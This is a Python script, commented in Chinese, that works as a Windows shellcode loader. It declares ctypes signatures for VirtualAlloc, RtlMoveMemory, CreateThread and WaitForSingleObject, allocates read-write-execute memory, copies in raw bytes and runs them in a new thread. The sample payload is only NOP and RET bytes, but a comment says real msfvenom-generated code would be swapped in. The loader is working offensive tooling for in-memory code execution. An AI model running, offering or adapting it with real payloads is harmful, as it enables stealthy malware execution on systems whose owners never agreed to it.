import ctypes
import time

# 显式加载 Windows 内核核心动态链接库
kernel32 = ctypes.windll.kernel32

# =====================================================================
# Windows API 参数与返回值类型声明 (确保 64 位系统下指针和句柄不被截断)
# =====================================================================

# 1. VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)
kernel32.VirtualAlloc.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_ulong, ctypes.c_ulong]
kernel32.VirtualAlloc.restype = ctypes.c_void_p

# 2. RtlMoveMemory(Destination, Source, Length)
# 注意：在 ctypes 中使用 memmove 往往更方便，但此处严格演示 RtlMoveMemory 的底层配置
kernel32.RtlMoveMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t]
kernel32.RtlMoveMemory.restype = None

# 3. CreateThread(lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId)
kernel32.CreateThread.argtypes = [ctypes.c_void_p, ctypes.c_size_t, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
kernel32.CreateThread.restype = ctypes.c_void_p

# 4. WaitForSingleObject(hHandle, dwMilliseconds)
kernel32.WaitForSingleObject.argtypes = [ctypes.c_void_p, ctypes.c_ulong]
kernel32.WaitForSingleObject.restype = ctypes.c_ulong

# =====================================================================
# 核心常量定义 (摘自 Windows SDK 头文件)
# =====================================================================
MEM_COMMIT = 0x00001000      # 预留并分配物理存储
MEM_RESERVE = 0x00002000     # 预留虚拟地址空间
PAGE_EXECUTE_READWRITE = 0x40 # 极其重要的权限：可读、可写、可执行
INFINITE = 0xFFFFFFFF        # 无限等待目标线程结束

def execute_binary_payload():
    # 示例用的二进制机器指令 (x64 架构下的空操作与安全返回指令: 90 代表 NOP, C3 代表 RET)
    # 在实际的自动化测试中，这里会替换为由工具（如 msfvenom）生成的真实平台代码
    payload_bytes = b"\x90\x90\x90\x90\xC3"
    payload_size = len(payload_bytes)

    print("[*] 正在准备在内存中执行二进制指令...")

    # 步骤 1: 申请一块具有可执行权限的内存缓冲区
    print("[*] 调用 VirtualAlloc 申请可执行内存 (PAGE_EXECUTE_READWRITE)...")
    memory_address = kernel32.VirtualAlloc(
        None, 
        payload_size, 
        MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    )

    if not memory_address:
        print("[-] 错误: 内存分配失败。")
        return

    print(f"[+] 内存分配成功！起始地址: {hex(memory_address)}")

    # 步骤 2: 将 Python 变量中的二进制数据拷贝到新申请的内存中
    print("[*] 调用 RtlMoveMemory 将数据写入目标地址...")
    # 使用 ctypes.byref 或 cast 将 Python 字节数组转换为 C 兼容的指针
    raw_buffer = ctypes.create_string_buffer(payload_bytes)
    kernel32.RtlMoveMemory(memory_address, raw_buffer, payload_size)

    # 步骤 3: 创建新线程，将 CPU 执行流导向该内存地址
    print("[*] 调用 CreateThread 启动独立执行线程...")
    thread_id = ctypes.c_ulong(0)
    thread_handle = kernel32.CreateThread(
        None, 
        0, 
        memory_address, 
        None, 
        0, 
        ctypes.byref(thread_id)
    )

    if not thread_handle:
        print("[-] 错误: 线程创建失败。")
        return

    print(f"[+] 线程创建成功！线程 ID: {thread_id.value}，句柄: {hex(thread_handle)}")

    # 步骤 4: 等待新创建的线程执行完毕
    print("[*] 正在等待线程执行流安全返回...")
    kernel32.WaitForSingleObject(thread_handle, INFINITE)
    print("[+] 内存指令执行完毕，执行流已安全返回主程序。")

if __name__ == "__main__":
    execute_binary_payload()
